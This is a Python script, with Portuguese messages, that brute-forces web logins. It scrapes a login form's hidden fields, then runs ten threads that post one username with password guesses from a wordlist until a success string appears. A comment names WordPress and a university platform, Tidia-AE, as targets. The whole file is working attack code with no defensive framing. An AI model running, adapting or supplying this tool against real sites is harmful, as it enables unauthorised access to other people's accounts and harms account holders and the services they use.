from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = '"loggedIn": true'
TARGET = "link"
WORDLIST = 'C:\\Users\\caioe\\Desktop\\VM\\wordlists\\cain.txt'

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('.//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nIniciando ataque de força bruta em {url}\n')
        print("Concluida a configuracao na qual o nome de usuario eh: %s\n" % username)
        
    def run_bruteforce(self, passwords, type):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords, type, ))
            t.start()
    
    def web_bruter(self, passwords, type):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['eid'] = self.username
        
        # Usado para WP. Para Tidia-AE, usarei o outro
        if type == 'JSON':
            while not passwords.empty() and not self.found:
                time.sleep(5)
                pw = passwords.get()
                print(f'Tentando nome de usuario/senha {self.username}/{pw:<10}')
                params['pw'] = pw
            
                resp1 = session.post(self.url, data=params)
                if SUCCESS in resp1.content.decode():
                    self.found = True
                    print(f'\n Ataque de força bruta bem sucedido')
                    print("Nome de usuario eh: %s" % self.username)
                    print("Senha eh: %s\n" % pw)
                    print('Concluido: limpando as outras threads...')
    
        if type == 'URL':
            while not passwords.empty() and not self.found:
                time.sleep(5)
                pw = passwords.get()
                params['pw'] = pw
                params['submit'] = 'Login'
                print(f'Tentando nome de usuario/senha {self.username}/{pw:<10}')
                in_link_url = f"{self.url}?{'&'.join(f'{k}={v}' for k, v in params.items())}"
                resp1 = session.post(in_link_url)

                if SUCCESS in resp1.content.decode():
                    self.found = True
                    print(f'\n Ataque de força bruta bem sucedido')
                    print("Nome de usuario eh: %s" % self.username)
                    print("Senha eh: %s\n" % pw)
                    print('Concluido: limpando as outras threads...')
            
if __name__ == '__main__':
    words = get_words()
    b = Bruter('user', TARGET)
    b.run_bruteforce(words, 'URL')
    